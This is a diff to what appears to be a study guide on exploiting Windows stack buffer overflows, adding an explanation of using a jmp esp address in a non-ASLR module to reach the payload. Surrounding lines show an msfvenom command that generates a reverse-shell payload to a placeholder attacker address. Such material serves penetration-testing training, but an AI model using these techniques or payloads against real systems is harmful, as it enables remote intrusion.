@@ -386,6 +386,15 @@ After adding the badchars 0x00, 0x0A and 0x0D, you can see how all the character
 So. all characters from 0x01 to 0xFF, except for 0x00, 0x0A and 0x0D, are correctly represented.
 
 6. Find the return address
+
+Your exploit payload ends up on the stack because you're overflowing a buffer on the stack, and this is how you gain control of the return address as well. ESP points directly to the start of your payload (after execution of the ret in the function you're attacking) because you put the payload right after the 4 bytes that overwrite the return address on the stack. ret pops 4 (or 8) bytes into EIP, leaving ESP pointing to the payload that directly follows.
+
+But you don't know what value ESP will have at that point, because of stack ASLR and because a different depth of call stack leading up to this point could change the address. So you can't hard-code a correct return address.
+
+However, if there are bytes that decode as jmp esp or call esp anywhere at a fixed (non-ASLRed) address in the process's memory, you can hard-code that address as the return address in your exploit. Execution will go there, then to your payload. 
+
+This is often the case: Some DLLs don't have ASLR enabled for their code, and the main executable's code may not be ASLRed either.
+
 Calculate op code of jmp esp using nasm_shell.rb:
 ```
 nasm_shell.rb jmp esp
@@ -420,7 +429,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f py -b "BADCHARS"
 
 
 8. Exploit
-Modify the exploit by adding the value of the offset, the jmp esp address, nops and the payload:
+Modify the exploit by adding the value of the offset, the jmp esp address (in little endian), nops and the payload:
 
 ```python
 #!/usr/bin/python
